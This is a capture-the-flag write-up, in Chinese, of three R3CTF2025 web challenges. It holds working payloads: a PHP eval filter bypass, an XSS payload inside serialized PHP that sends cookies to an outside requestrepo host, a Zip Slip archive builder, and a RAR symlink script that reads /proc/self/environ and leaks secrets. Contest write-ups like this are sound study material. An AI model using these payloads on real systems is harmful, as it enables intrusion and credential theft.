+++
title = "R3CTF2025"
slug = "r3ctf2025"
description = "这比赛要是100分我才应该打的"
date = "2025-07-05T11:03:59"
lastmod = "2025-07-05T11:03:59"
image = ""
license = ""
categories = ["赛题"]
tags = ["php"]
+++

## **Evalgelist**

```php
<?php
        if (isset($_GET['input'])) {
            echo '<div class="output">';

            $filtered = str_replace(['$', '(', ')', '`', '"', "'", "+", ":", "/", "!", "?"], '', $_GET['input']);
            $cmd = $filtered . '();';
            
            echo '<strong>After Security Filtering:</strong> <span class="filtered">' . htmlspecialchars($cmd) . '</span>' . "\n\n";
            
            echo '<strong>Execution Result:</strong>' . "\n";
            echo '<div style="border-left: 3px solid #007bff; padding-left: 15px; margin-left: 10px;">';
            
            try {
                ob_start();
                eval($cmd);
                $result = ob_get_clean();
                
                if (!empty($result)) {
                    echo '<span class="success">✅ Function executed successfully!</span>' . "\n";
                    echo htmlspecialchars($result);
                } else {
                    echo '<span class="success">✅ Function executed (no output)</span>';
                }
            } catch (Error $e) {
                echo '<span class="error">❌ Error: ' . htmlspecialchars($e->getMessage()) . '</span>';
            } catch (Exception $e) {
                echo '<span class="error">❌ Exception: ' . htmlspecialchars($e->getMessage()) . '</span>';
            }
            
            echo '</div>';
            echo '</div>';
        }
        ?>
```

注释可以绕过，现在想办法包含文件就行，打印数组什么的是不太可能了，`DIRECTORY_SEPARATOR` 是一个 **PHP 预定义常量**，用于表示当前操作系统的目录分隔符。它的作用是使代码能够在不同操作系统上正确运行。也就是说在Windows上面是`\`，在类unix上面是`/`。相当牛逼，网上查到可以用Heredoc语法

```
include%20DIRECTORY%5FSEPARATOR%2E%3C%3C%3CF%0Aflag%0AF%3B%23
```

不过当我们知道这个变量之后问题就迎刃而解了

```php
include DIRECTORY_SEPARATOR.flag;%23
```

## **Silent Profit**

```js
const express = require('express');
const puppeteer = require('puppeteer');

const app = express();
app.use(express.urlencoded({ extended: false }));


const flag = process.env['FLAG'] ?? 'flag{test_flag}';
const PORT = process.env?.BOT_PORT || 31337;

app.post('/report', async (req, res) => {
  const { url } = req.body;

  if (!url || !url.startsWith('http://challenge/')) {
    return res.status(400).send('Invalid URL');
  }

  try {
    console.log(`[+] Visiting: ${url}`);
    const browser = await puppeteer.launch({
      headless: 'new',
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
      ]
    });

    await browser.setCookie({ name: 'flag', value: flag, domain: 'challenge' });
    const page = await browser.newPage();
    await page.goto(url, { waitUntil: 'networkidle2', timeout: 5000 });
    await page.waitForNetworkIdle({timeout: 5000})
    await browser.close();
    res.send('URL visited by bot!');
  } catch (err) {
    console.error(`[!] Error visiting URL:`, err);
    res.status(500).send('Bot error visiting URL');
  }
});

app.get('/', (req, res) => {
  res.send(`
    <h2>XSS Bot</h2>
    <form method="POST" action="/report">
      <input type="text" name="url" value="http://challenge/?data=..." style="width: 500px;" />
      <button type="submit">Submit</button>
    </form>
  `);
});

app.listen(PORT, () => {
  console.log(`XSS bot running at port ${PORT}`);
});


```

```php
<?php 
show_source(__FILE__);
unserialize($_GET['data']);

```

原生类的尝试，能够进行xss的只有Error/Exception，注意到是PHP/8.4.8，队友问AI说哪些类可以序列化，发现关键类`DateInterval`，手动构造payload成功弹窗

```python
pay = "A5rZ<script>alert(`xss`)</script>"
pay_end = 'O:12:"DateInterval":10:{s:1:"y";i:2;s:1:"m";i:0;s:1:"d";i:4;s:1:"h";i:6;s:1:"i";i:30;s:1:"s";i:0;s:1:"f";d:0;s:6:"invert";i:0;s:'+ str(len(pay)) + ':"' + pay + '";b:0;s:11:"from_string";b:0;}'
print(pay_end)
```

直接Xbot就好了

```python
pay = "A5rZ<script>fetch(`${'https://kpkledvh.requestrepo.com/'}${document.cookie}`)</script>"
pay_end = 'O:12:"DateInterval":10:{s:1:"y";i:2;s:1:"m";i:0;s:1:"d";i:4;s:1:"h";i:6;s:1:"i";i:30;s:1:"s";i:0;s:1:"f";d:0;s:6:"invert";i:0;s:'+ str(len(pay)) + ':"' + pay + '";b:0;s:11:"from_string";b:0;}'
print(pay_end)
```

不得不说，A5rZ师傅太强了

## **PigSay**

```python
#!/usr/bin/env python

from importlib import reload
from os import environ
from pathlib import Path
from subprocess import check_output
from tempfile import NamedTemporaryFile, TemporaryDirectory
from uuid import uuid4

import jwt
import pigsay
import uvicorn
from litestar import Litestar, get, post
from litestar.datastructures import UploadFile
from litestar.params import Body
from litestar.static_files import create_static_files_router

JWT_KEY = environ.pop("JWT_KEY").encode()
PIG_KEY = environ.pop("PIG_KEY").encode()
converter = pigsay.PigConverter(PIG_KEY)


@get("/api/ping")
async def ping() -> dict[str, str]:
    """
    Ping? Pong!
    """
    return {"code": 20000, "msg": "pong"}


@post("/api/encrypt")
async def encrypt(data: dict) -> dict[str, str]:
    """
    Encrypt some text to pigsay text.
    """
    try:
        ret = converter.encrypt_string(str(data["text"]))
        return {"code": 20000, "msg": "encrypt success", "data": ret}
    except Exception as e:
        return {"code": 50000, "msg": f"encrypt error: {e}"}


@post("/api/decrypt")
async def decrypt(data: dict) -> dict[str, str]:
    """
    Decrypt some pigsay text.
    """
    try:
        ret = converter.decrypt_string(str(data["text"]))
        return {"code": 20000, "msg": "decrypt success", "data": ret}
    except Exception as e:
        return {"code": 50000, "msg": f"decrypt error: {e}"}


def check_file_type(filename: str):
    allows = [".zip", ".rar", ".7z", ".tar.gz"]
    return any([filename.endswith(allow) for allow in allows])


def uncompress_file(filepath: str, handler: callable):
    file = Path(filepath)
    suffix = "".join(file.suffixes)
    with TemporaryDirectory(uuid4().hex) as tmp_dir:
        tmp_dir = Path(tmp_dir)
        try:
            args = (filepath, str(tmp_dir.absolute()))
            match suffix:
                case ".zip":
                    unzip_file(*args)
                case ".rar":
                    unrar_file(*args)
                case ".7z":
                    un7z_file(*args)
                case ".tar.gz":
                    untar_file(*args)
                case _:
                    raise Exception(f"Unsupported file type: {suffix}")
            return {
                "code": 20000,
                "msg": "success",
                "data": {
                    item.name: handler(item.read_text())
                    for item in tmp_dir.glob("*.txt")
                },
            }
        except Exception as e:
            return {"code": 50000, "msg": f"Uncompress file error: {e}"}


def unzip_file(filepath: str, extract_to_filepath: str):
    import zipfile

    with zipfile.ZipFile(filepath) as zf:
        zf.extractall(extract_to_filepath)


def unrar_file(filepath: str, extract_to_filepath: str):
    import rarfile

    with rarfile.RarFile(filepath) as rf:
        rf.extractall(extract_to_filepath)


def un7z_file(filepath: str, extract_to_filepath: str):
    import py7zr

    with py7zr.SevenZipFile(filepath) as sf:
        sf.extractall(extract_to_filepath)


def untar_file(filepath: str, extract_to_filepath: str):
    import tarfile

    with tarfile.open(filepath, "r:gz") as tf:
        tf.extractall(extract_to_filepath)


@post("/api/file/encrypt", request_max_body_size=1024 * 1024)
async def encrypt_file(
    data: UploadFile = Body(media_type="multipart/form-data"),
) -> dict[str, str]:
    """
    We can encrypt some txt file in a compressed file
    """
    filename = data.filename
    if not check_file_type(filename):
        return {"code": 40000, "msg": "Invalid file type"}
    content = await data.read()
    try:
        with NamedTemporaryFile(mode="wb", suffix=filename) as tmp:
            tmp.write(content)
            tmp.seek(0)
            return uncompress_file(tmp.name, converter.encrypt_string)
    except Exception as e:
        return {"code": 50000, "msg": f"Encrypt file error: {e}"}


@post("/api/file/decrypt", request_max_body_size=1024 * 1024)
async def decrypt_file(
    data: UploadFile = Body(media_type="multipart/form-data"),
) -> dict[str, str]:
    """
    We can decrypt some txt file in a compressed file
    """
    filename = data.filename
    if not check_file_type(filename):
        return {"code": 40000, "msg": "Invalid file type"}
    content = await data.read()
    try:
        with NamedTemporaryFile(mode="wb", suffix=filename) as tmp:
            tmp.write(content)
            tmp.seek(0)
            return uncompress_file(tmp.name, converter.decrypt_string)
    except Exception as e:
        return {"code": 50000, "msg": f"Encrypt file error: {e}"}


@post(f"/api/admin/upgrade/{uuid4().hex}")
async def upgrade(headers: dict) -> dict[str, str]:
    """
    Only admin can do!
    """
    token = headers.get("r3-token")
    if not token:
        return {"code": 40300, "msg": "Authentication Failed"}
    try:
        if jwt.decode(token, JWT_KEY, algorithms=["HS256"]).get("role") != "admin":
            return {"code": 40300, "msg": "Permission Denied"}
    except Exception:
        return {"code": 40300, "msg": "Authentication Error"}

    try:
        ret = (
            check_output(
                ["/app/upgrade.sh"],
                env=None,
                universal_newlines=True,
                timeout=60,
                user="r3ctf",
            )
            .strip()
            .replace("\n", ", ")
        )

        reload(pigsay)

        global converter
        converter = pigsay.PigConverter(PIG_KEY)

        return {"code": 20000, "msg": "Upgrade successfully", "data": ret}
    except Exception as e:
        return {"code": 50000, "msg": "Upgrade failed", "data": str(e)}


app = Litestar(
    route_handlers=[
        ping,
        encrypt,
        decrypt,
        encrypt_file,
        decrypt_file,
        upgrade,
        create_static_files_router(path="/static", directories=["static"]),
        create_static_files_router(path="/", directories=["public"], html_mode=True),
    ],
)

uvicorn.run(app, host="0.0.0.0", port=8000)

```

`extractall()`没有路径验证，典型的Zip Slip漏洞，看到会执行`/app/upgrade.sh`，所以目的就是覆盖这个，然后jwt伪造，再执行即可。

```python
import zipfile

with zipfile.ZipFile("exploit.zip", "w") as zf:
    zf.writestr("../../../../../../../../../../../app/upgrade.sh", "#!/bin/bash\npwd > /tmp/1.txt\n")
    zf.writestr("unique_flag_123456.txt", "I was here")
```

但是并没有成功，发现python版本非常高，https://github.com/python/cpython/pulls?q=is%3Apr+zipfile+path+traversal+is%3Aclosed   所以是被过滤了，暂时想不到什么办法来解决了，目录也要爆破TM的

```python
import requests
from uuid import uuid4
while True:
    uuid = uuid4().hex
    url = f"http://baozongwi.suer.cc:8000/api/admin/upgrade/{uuid}"
    r = requests.get(url)
    if r.status_code != 200:
        print(url)
        continue

    else:
        print("right")
        print(url)
        break
```

但是忽略了一点Litestar是默认会生成OpenAI的json在`/schema`

```
/schema/swagger
/schema/redoc
```

测试发现rar软连接可以任意文件读取

```python
import argparse
import shutil
import subprocess
import tempfile
import requests
from pathlib import Path

def ensure_rar():
    rar = shutil.which("rar") or shutil.which("rar.exe")
    if not rar:
        raise RuntimeError("未找到 rar CLI")
    return rar

def build_rar_symlink(archive_path, link_name, target):
    rar = ensure_rar()
    with tempfile.TemporaryDirectory() as tmp:
        t = Path(tmp)
        (t / link_name).symlink_to(target)
        subprocess.run([rar, "a", "-ol", "-ep", archive_path.name, link_name], cwd=t, check=True)
        shutil.move(t / archive_path.name, archive_path)

def upload_file(file_path):
    with open(file_path, 'rb') as f:
        files = {'data': (file_path, f, 'application/x-rar-compressed')}
        response = requests.post("http://baozongwi.suer.cc:8000/api/file/encrypt", files=files, timeout=30)
    print(f"状态码: {response.status_code}")
    print(f"响应: {response.text}")
    return response.status_code == 200

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="/proc/self/environ")
    ap.add_argument("--out", default="evil.rar")
    ap.add_argument("--name", default="secret.txt")
    ap.add_argument("--no-upload", action="store_true")
    args = ap.parse_args()
    
    build_rar_symlink(Path(args.out), args.name, args.target)
    
    if not args.no_upload:
        upload_file(args.out)

if __name__ == "__main__":
    main()
```

读取到了jwt的密钥

```
FLAG=R3CTF{fake_flag}HOME=/home/r3ctfHOSTNAME=301e80c2861eJWT_KEY=3910903be7054ea38eb9f53e400f3a97LOGNAME=r3ctfPATH=/app/.venv/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPIG_KEY=a788f4f7d3e24b47bb4afb7ab6516796PWD=/appPYTHON_SHA256=7ac9e84844bbc0a5a8f1f79a37a68b3b8caf2a58b4aa5999c49227cb36e70ea6PYTHON_VERSION=3.14.0b2SHELL=/bin/shSHLVL=2USER=r3ctfUV=/bin/uvUV_RUN_RECURSION_DEPTH=1VIRTUAL_ENV=/app/.venv
```

后续是利用CVE-2025-4517写一个假库，即可RCE，原理是`/app/upgrade.sh`其实本身只执行`uv add -U pigsay`。我们把这个库覆盖掉即可
